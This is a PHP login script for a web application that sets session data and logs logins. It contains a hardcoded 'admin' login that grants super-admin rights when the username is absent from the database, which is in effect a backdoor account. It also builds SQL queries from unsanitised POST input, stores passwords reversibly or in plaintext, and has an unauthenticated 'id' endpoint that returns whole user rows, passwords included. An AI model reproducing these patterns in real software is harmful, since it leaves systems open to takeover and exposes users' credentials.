<?php
include '../session.php';
include '../class/clsitems.php';
include '../class/clslogs.php';

$ip = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
$location = ''; //json_decode(file_get_contents("http://ipinfo.io/"));

if(isset($_POST['login'])){
	$username 	= $_POST['username'];
	$password 	= $_POST['password'];
	$sql 		= "select * from tbl_user where username = '$username'";
	$query 		= $db->query($sql);
	if(mysqli_num_rows($query) <= 0){
		if(($username == 'admin') && ($password == $hm)) { 
			$_SESSION['admin'] 			= 'go...';
			$_SESSION['iduser'] 		= 0;
			$_SESSION['user'] 			= 'Donz';
			$_SESSION['usercode'] 		= 0;
			$_SESSION['restriction'] 	= 101; //101 super admin
			$_SESSION['success'] 		= 'Welcome Programmer';
			$_SESSION['position'] 		= 'Programmer/Web. Developer';
			$_SESSION['area'] 			= "DMO";
			$_SESSION['empno'] 			=  0;
			$_SESSION['usertype'] 		=  0;
			$_SESSION['img'] 			= "avatar04.png";
			$record->recordlogs($_SESSION['iduser'],"Login", "Login Admin - ".$_SERVER['HTTP_USER_AGENT']."|".$location->city.",".$location->ip."|".$ip);

			include '../includes/reordercount.php'; 
			include '../serverside/ss_equipment_history_helper.php';

			header('location: ../index.php');
		} else {
			$_SESSION['error'] = "Invalid username or password!";
			header('location: ../login.php');
		}
	}
	else{
		$row = $query->fetch_assoc();
		if(($password == decryptStr($row['password'])) || ($password == $row['password'])){
			$_SESSION['admin'] 			= 'go...';
			$_SESSION['iduser'] 		= $row['iduser'];
			$_SESSION['user'] 			= $row['fullname'];
			$_SESSION['usercode'] 		= $row['doccode'];
			$_SESSION['restriction'] 	= $row['restriction'];
			$_SESSION['position'] 		= $row['position'];
			$_SESSION['success'] 		= 'Welcome! '. $row['fullname'];
			$_SESSION['area'] 			=  $row['area'];
			$_SESSION['empno'] 			=  $row['empno'];
			$_SESSION['usertype'] 		=  $row['usertype'];
			$_SESSION['img'] 			= $row['img'];

			$record->recordlogs($_SESSION['iduser'],"Login", "Login [".$row['fullname']."] - ".$_SERVER['HTTP_USER_AGENT']."|".$location->city.",".$location->ip."|".$ip);

			include '../includes/reordercount.php';
			include '../serverside/ss_equipment_history_helper.php';

			if(intval($row['usertype']) == 0 && $row['area'] <> 'DMO' ) {
				header('location: ../user_switch.php');
			} else {
				if($row['restriction'] == 2)
					header('location: ../index2.php');
				else 
					header('location: ../index.php');
			}



		}
		else{
			$_SESSION['error'] = 'Incorrect password';
			header('location: ../login.php');
		}
	}
}
else{
	$_SESSION['error'] = 'Input admin credentials first';
	header('location: ../login.php');
}

if(isset($_POST['id'])) {
	$id = $_POST['id'];
	$sql = "select * from tbl_user where iduser = '$id'";
	$query = $db->query($sql)->fetch_assoc();
	echo json_encode($query);
}


?>